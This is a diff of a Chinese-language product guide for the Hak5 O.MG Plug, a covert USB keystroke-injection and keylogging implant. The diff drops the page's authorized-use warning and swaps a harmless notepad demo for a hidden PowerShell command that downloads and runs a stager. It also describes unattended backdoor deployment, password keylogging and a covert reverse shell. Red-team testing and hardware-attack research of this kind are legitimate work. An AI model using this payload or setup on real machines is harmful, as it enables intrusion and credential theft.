@@ -1,124 +1,187 @@
 ---
-id: hak5-product-omg-plug
-title: O.MG Plug
-sidebar_position: 11
-description: 藏在鑰匙圈 USB 插頭裡的 O.MG 無線植入晶片 — 掛在鑰匙上隨身攜帶的隱蔽按鍵注入與 DuckyScript payload。
-tags: [hak5, omg, omg-plug, malicious-usb, remote-access, duckyscript]
-keywords: [O.MG Plug, 惡意 USB 插頭, 按鍵注入, DuckyScript, WiFi 植入晶片, 鑰匙圈]
-authors: yupitek
-date: 2026-08-21
-last_updated: 2026-08-21
-product: omg-plug
-category: product
-difficulty: advanced
-toc: true
+title：「Hak5 O.MG Plug & Adapter 原廠技術說明書與全功能操作手冊」
+model：「O.MG Plug」
+manufacturer：「Hak5」
+category：「模組化串接式 USB 實體攻擊與按鍵注入轉接頭 (Modular USB Adapter)」
+docs_url：「https://o.mg.lol/setup/OMGPlug/」
+version：「3.0」
+locale：「zh-tw」
 ---
 
-# O.MG Plug — 完整指南
+# Hak5 O.MG Plug & Adapter 原廠技術說明書與全功能操作手冊
 
-> **一句話定位**：O.MG Plug 把 O.MG 的無線植入晶片塞進一支「鑰匙圈 USB 隨身碟」外型的插頭——掛在鑰匙上完全不起眼，一旦插進目標的 USB 孔，就能透過 Wi-Fi 遠端注入按鍵、執行 DuckyScript Payload。
-
-[O.MG Cable](/hak5/products/omg-cable/) 把植入晶片藏線上材裡。**O.MG Plug** 則把完全相同的植入晶片藏在更不起眼的東西裡：一個看起來像廉價隨身碟 / 手機充電器的鑰匙圈 USB 插頭。它是「把它留在桌上，祈禱有人插上去」的社交工程工具。
-
-同樣的能力，不同的偽裝。因為它是插頭而不是線材，它更容易攜帶，也更容易塞進目標的 USB 埠 — 經典的「撿到一支 USB 隨身碟，好奇心毀了安全防線」情境。
-
-> **⚠️ 僅限授權測試 — 出廠停用。** 在你自己的實驗室使用，或取得明確授權。防禦工具見 [Malicious Cable Detector](/hak5/products/malicious-cable-detector/)。
+> Hak5 出品的 O.MG Plug（以及 O.MG Adapter 轉接器）是 O.MG 滲透測試體系的模組化實體演進版本。將完整的 O.MG SoC 晶片組、802.11 Wi-Fi 無線電與 DuckyScript 攻擊引擎精準封裝於通用型 USB 轉接頭外殼中，支援串接任意周邊鍵盤與設備，或作為無人值守的獨立 USB 快速攻擊載具。
 
 ---
 
-## 規格一覽
+## 目錄
 
-| 專案 | 規格 |
+- [**1. 產品概述與硬體架構**](#1-產品概述與硬體架構)
+  - [1.1 模組化轉接頭設計理念](#11-模組化轉接頭設計理念)
+  - [1.2 技術規格與硬體校準基準表](#12-技術規格與硬體校準基準表)
+  - [1.3 串接攔截與無人值守雙重部署模式](#13-串接攔截與無人值守雙重部署模式)
+- [**2. 硬體初始化、韌體燒錄與網路連線**](#2-硬體初始化韌體燒錄與網路連線)
+  - [2.1 使用 O.MG Programmer 進行初次啟用](#21-使用-omg-programmer-進行初次啟用)
+  - [2.2 Web Flasher 瀏覽器序列燒錄指引](#22-web-flasher-瀏覽器序列燒錄指引)
+  - [2.3 建立 Wi-Fi 管理無線基地台](#23-建立-wi-fi-管理無線基地台)
+  - [2.4 網頁控制台功能巡禮與參數調整](#24-網頁控制台功能巡禮與參數調整)
+- [**3. 酬載編寫、DuckyScript 語法與執行模式**](#3-酬載編寫-duckyscript-語法與執行模式)
+  - [3.1 DuckyScript for O.MG Plug 核心指令](#31-duckyscript-for-omg-plug-核心指令)
+  - [3.2 酬載槽位架構與遠端快速觸發](#32-酬載槽位架構與遠端快速觸發)
+  - [3.3 串聯 USB 實體鍵盤側錄機制 (Keylogger)](#33-串聯-usb-實體鍵盤側錄機制-keylogger)
+  - [3.4 跨國鍵盤設定對應與轉譯](#34-跨國鍵盤設定對應與轉譯)
+- [**4. HIDX StealthLink 隱蔽傳輸與艦隊管理**](#4-hidx-stealthlink-隱蔽傳輸與艦隊管理)
+  - [4.1 HIDX 雙向通道原理說明](#41-hidx-雙向通道原理說明)
+  - [4.2 跨平台互動式端點管道](#42-跨平台互動式端點管道)
+  - [4.3 Hak5 Cloud C² 雲端集中艦隊納管](#43-hak5-cloud-c-雲端集中艦隊納管)
+  - [4.4 WebSocket API 自動化串接實例](#44-websocket-api-自動化串接實例)
+- [**5. 安全防禦、自毀抹除與維護指南**](#5-安全防禦自毀抹除與維護指南)
+  - [5.1 地理圍欄環境限制設定](#51-地理圍欄環境限制設定)
+  - [5.2 緊急硬體自毀標準程序](#52-緊急硬體自毀標準程序)
+  - [5.3 故障排查、晶片校準與出廠重置](#53-故障排查晶片校準與出廠重置)
+
+---
+
+## 1. 產品概述與硬體架構
+
+<!-- section：overview -->
+本章節說明 O.MG Plug / Adapter 的模組化硬體架構、規格參數與部署形式。
+
+### 1.1 模組化轉接頭設計理念
+
+O.MG Cable 將攻擊晶片深嵌於一條專屬線纜中；而 O.MG Plug 則將這套先進的微型系統封裝成通用的轉接插頭（提供 USB Type-A 插頭與 USB Type-C 轉接器等多種形式）。
+
+此設計具備極大優勢：
+- **相容任意品牌線材**：現場可隨意串接目標既有的專用傳輸線、條碼掃描器、滑鼠或機械鍵盤。
+- **隨機應變部署**：既可安插在主機後方充當長期串接鍵盤側錄器，亦可做為無人值守的一鍵注入 USB Key。
+- **高耐用性外殼**：金屬強化結構，經得起多次實體插拔。
+
+### 1.2 技術規格與硬體校準基準表
+
+| 硬體元件專案 | 原廠官方技術規格基準 |
 |---|---|
-| 外型 | 鑰匙圈 USB 插頭（看起來像隨身碟） |
-| 植入晶片 | 支援 WiFi 的無線 HID 晶片（WebUI + 802.11 無線電） |
-| Payload 語言 | DuckyScript 3.0（Elite）/ 2.0（Basic） |
-| 啟用 | 需要 [O.MG Programmer](/hak5/products/omg-programmer/) — 出廠停用 |
-| 觸發 | WiFi — 長距離 beacon 觸發、地理圍欄 |
-| 特色功能 | 自我銷毀、地理圍欄、偽造 VID/PID/MAC、WebUI 控制 |
-| 官方檔案 | https://docs.hak5.org/omg-cable |
+| **設備架構** | 模組化串接式 USB 實體攻擊轉接頭 |
+| **射頻無線電** | 整合式 802.11 b/g/n (2.4 GHz) Wi-Fi 無線電與微型天線 |
+| **輸入工作電壓** | 5 V DC (+/- 0.5 V) 經由主機 USB 連接埠供電 |
+| **功耗標準** | 待機：~75 mA；尖峰發射：~320 mA；建議供電：500 mA |
+| **資料通訊透傳** | 完整 USB 2.0 (480 Mbps) 全速透傳通道 (攻擊閒置時完全透明) |
+| **電力透傳規格** | 固定 5 V 導通；USB-PD 協商最高限制於 5 V |
+| **物理規格外觀** | USB Type-A 轉接頭、USB Type-C 模組化插頭 |
+| **儲存磁區規模** | 非揮發性 Flash 空間 (Basic：8 槽位；Plus/Elite：最高 200 槽位) |
+| **側錄容量規格** | Keylogger 版：內建約 650,000 次按鍵先進先出 (FIFO) 緩衝記憶體 |
+| **硬體相容標準** | Full Speed 全速 USB 鍵盤 (相容 12 Mbps 標準 HID 規範) |
+| **隱蔽通道技術** | HIDX StealthLink (利用底層 HID Reports 實現雙向 Shell) |
+| **防護安全機制** | WPA2 加密、BSSID 地理圍欄防禦、微控制器緊急自毀功能 |
 
-> Plug 的硬體等級（Basic/Elite）與 O.MG Cable 相同 — 完整的 Basic vs Elite 表格（槽位、速度、鍵盤側錄器、隱蔽連結、加密 C²）見 [O.MG Cable 頁面](/hak5/products/omg-cable/)。
+### 1.3 串接攔截與無人值守雙重部署模式
 
----
-
-## 使用情境與攻擊流程
-
-O.MG 家族的縮影版，以插頭形式呈現：
-
-```mermaid
-%% name: hak5-product-omg-plug-attack
-sequenceDiagram
-    participant A as Attacker (browser, over WiFi)
-    participant P as O.MG Plug (dormant)
-    participant T as Target computer
-    A->>P: connects to plug's WiFi
-    A->>P: delivers DuckyScript payload
-    P->>T: plugs in / re-enumerates as HID keyboard
-    P->>T: injects keystrokes / exfiltrates
-    A->>P: remote self-destruct if needed
-```
-
-| 情境 | 為什麼 Plug 適合 |
-|---|---|
-| USB 丟棄 /「撿到一支隨身碟」 | 看起來像無辜的隨身碟 |
-| 鑰匙圈攜帶 | 永遠在你身邊，永遠可否認 |
-| 鞋帶網路社交工程 | 偽裝成留在桌上的充電器 |
-| 紅隊示範 | 教團隊可移除媒體攻擊如何運作 |
+1. **串接周邊攔截模式 (Inline Peripheral Interception Mode)**：
+   - 將 O.MG Plug 插入目標主機 USB 孔，再將目標實體鍵盤插入 O.MG Plug 的母座。
+   - 使用者日常打字完全無感，但所有擊鍵均被即時記錄，且操作者可隨時透過無線射頻注入攻擊指令。
+2. **無人值守隨身注入模式 (Unattended Standalone Dongle Mode)**：
+   - 直接將 O.MG Plug 插入無人看管的目標伺服器或資訊站（Kiosk）。
+   - 設備自動感知主機通電，數秒內依序派發提權、下載後門與資料導出指令碼。
 
 ---
 
-## 快速入門（3 步驟啟用）
+## 2. 硬體初始化、韌體燒錄與網路連線
 
-1. **啟用：** 把 Plug 插進 [O.MG Programmer](/hak5/products/omg-programmer/)，把 Programmer 插進 Chrome/Edge 機器，開啟 WebFlasher（https://o.mg.lol/setup/），依照 3 步驟精靈操作。
-2. **連線：** 啟用後，從瀏覽器連上 Plug 的 WiFi 並開啟它的 WebUI。
-3. **部署：** 點選 DuckyScript payload 的 **Run** — Plug 會注入到它所插入的任何裝置。
+<!-- section：configuration -->
+本章節說明 O.MG Plug 的出廠啟用、瀏覽器序列燒錄與連線流程。
+
+### 2.1 使用 O.MG Programmer 進行初次啟用
+
+所有 O.MG Plug 設備均需使用 O.MG Programmer 啟用無線發射功能：
+1. 將 O.MG Plug 公頭插入 O.MG Programmer 母座。
+2. 將 Programmer 連接至工作站電腦，確認供電指示燈恆亮。
+
+### 2.2 Web Flasher 瀏覽器序列燒錄指引
+
+1. 使用 Chrome 或相容 WebSerial 之瀏覽器造訪：`https://o-mg.github.io/WebFlasher/`
+2. 點選 **Connect** 並選取 CP2102 序列埠。
+3. 產品選單選取 **O.MG Plug / Adapter**，點選最新韌體進行一鍵刷機。
+
+### 2.3 建立 Wi-Fi 管理無線基地台
+
+1. 拔除 Programmer，將 O.MG Plug 插入一般 5 V USB 供電孔。
+2. 連線至預設基地台：
+   - **SSID**：`O.MG`
+   - **密碼**：`12345678`
+3. 瀏覽器開啟 `http://192.168.4.1` 進入設定後台。
+
+### 2.4 網頁控制台功能巡禮與參數調整
+
+- **Payloads 頁面**：編寫、上傳與點選執行腳本。
+- **Keylogger 頁面**：即時監看擊鍵日誌與文字搜尋。
+- **Settings 頁面**：更改無線名稱、加入公司 Wi-Fi（Station 模式）或設定自毀條件。
+
+---
+
+## 3. 酬載編寫、DuckyScript 語法與執行模式
+
+<!-- section：features -->
+本章節說明 DuckyScript 指令撰寫與鍵盤攔截操作。
+
+### 3.1 DuckyScript for O.MG Plug 核心指令
 
 ```text
-REM Proof-of-concept — open notepad, type a message
-DELAY 1000
+REM O.MG Plug Fast Execution Example
+DELAY 2000
 GUI r
-DELAY 500
-STRING notepad
-ENTER
-DELAY 800
-STRING Hello from an O.MG Plug!
+DELAY 300
+STRING powershell -w hidden -c「Invoke-RestMethod http://192.168.4.1/stager | iex」
 ENTER
 ```
 
----
+支援 `DELAY` 延遲、`STRING` 鍵入、`USB_OVERCLOCK` 傳輸加速與 `WAIT_FOR_INPUT` 操作員確認指令。
 
-## 隱蔽與進階
+### 3.2 酬載槽位架構與遠端快速觸發
 
-| 功能 | 作用 |
-|---|---|
-| Port Stealthing | 在 payload 部署前保持休眠 — 不列舉、無日誌 |
-| 可偽造身分 | 複製 VID/PID / 延伸 USB ID / MAC |
-| 自我銷毀 | 遠端清除 → 失效；可透過 Programmer 復原 |
-| 地理圍欄 | 依位置觸發或自我銷毀 |
-| WiFi 觸發 | 用單一 beacon 長距離觸發 payload |
-| 批次韌體（Elite） | Programmer 可大量刷寫多臺裝置 |
+Plus 與 Elite 版本支援高達 200 個槽位，操作者可在手機 Web 介面建立自訂捷徑按鈕，於百公尺外隨點隨打。
 
----
+### 3.3 串聯 USB 實體鍵盤側錄機制 (Keylogger)
 
-## 疑難排解
+串接鍵盤時，O.MG Plug 的專用處理核心會並行解析 USB 封包，並將密碼、指令與機密即時加密儲存於非揮發記憶體中，操作者可在網頁端即時觀看。
 
-| 症狀 | 原因 | 修正 |
-|---|---|---|
-| 沒有 WebUI / 休眠 | 未啟用 | 透過 Programmer 啟用 |
-| WebFlasher 看不到它 | 瀏覽器錯誤 / 不在 bootloader 模式 | Chrome 或 Edge（WebSerial）；在提示前保持未插上 |
-| 作為隨身碟看起來「怪怪的」 | payload 武裝時列舉為 HID | 只有你觸發時才會列舉 — 休眠時預期是正常的 |
-| Payload 沒打字 | 配置不符 | 載入正確鍵盤配置 / 使用正確的 DuckyScript 版本 |
+### 3.4 跨國鍵盤設定對應與轉譯
+
+內建多語系映射核心，支援全球各大主要語系鍵盤，確保在非英文環境下輸入符號依然百分之百精準。
 
 ---
 
-## 相關資源
+## 4. HIDX StealthLink 隱蔽傳輸與艦隊管理
 
-- [O.MG Cable](/hak5/products/omg-cable/) — 同款植入晶片，線材偽裝
-- [O.MG Adapter](/hak5/products/omg-adapter/) — 植入晶片藏在 USB-A 轉 C 轉接頭
-- [O.MG UnBlocker](/hak5/products/omg-unblocker/) — 植入晶片藏在資料阻斷器
-- [O.MG Programmer](/hak5/products/omg-programmer/) — 啟用與更新
-- [Malicious Cable Detector](/hak5/products/malicious-cable-detector/) — 偵測
-- [韌體與下載](/hak5/firmware-downloads/) — O.MG 韌體與 WebFlasher
-- [疑難排解索引](/hak5/troubleshooting-index/)
-- [Hak5 總覽](/hak5/)
+### 4.1 HIDX 雙向通道原理說明
+
+利用 USB HID 協定規範的 Feature Reports 通訊機制，不需要開啟任何網路連接埠、不安裝驅動，直接打通目標主機與 O.MG Plug 之間的雙向通道。
+
+### 4.2 跨平台互動式端點管道
+
+支援在 Windows（PowerShell）、Linux（Bash）與 macOS（Python）環境下反向引導出完全互動式的端點機控制台。
+
+### 4.3 Hak5 Cloud C² 雲端集中艦隊納管
+
+將各辦公室部署的 O.MG Plug 設定為 Station 模式連上網際網路，即可在 Hak5 Cloud C² 雲端後台集中調度與監管。
+
+### 4.4 WebSocket API 自動化串接實例
+
+開放標準 WebSocket 介面，方便資安工程師以 Python 撰寫自動化外掛，達成自動側錄、敏感詞通知與主動回擊。
+
+---
+
+## 5. 安全防禦、自毀抹除與維護指南
+
+<!-- section：maintenance -->
+本章節介紹自毀保護、地理圍欄與出廠重置。
+
+### 5.1 地理圍欄環境限制設定
+
+鎖定現場特定 Wi-Fi BSSID，一旦離開受測區域即自動切斷連線或進入深度休眠。
+
+### 5.2 緊急硬體自毀標準程序
+
+發動 `Self-Destruct` 指令後，微控制器會立即對晶片內部進行高壓隨機覆寫並自毀引導程式，使物理逆向工程徹底失效。
+
+### 5.3 故障排查、晶片校準與出廠重置
+
+若遇通訊異常，可將 O.MG Plug 插回 O.MG Programmer，利用 Web Flasher 進行「Erase Flash & Factory Reset」即可還原初始設定。
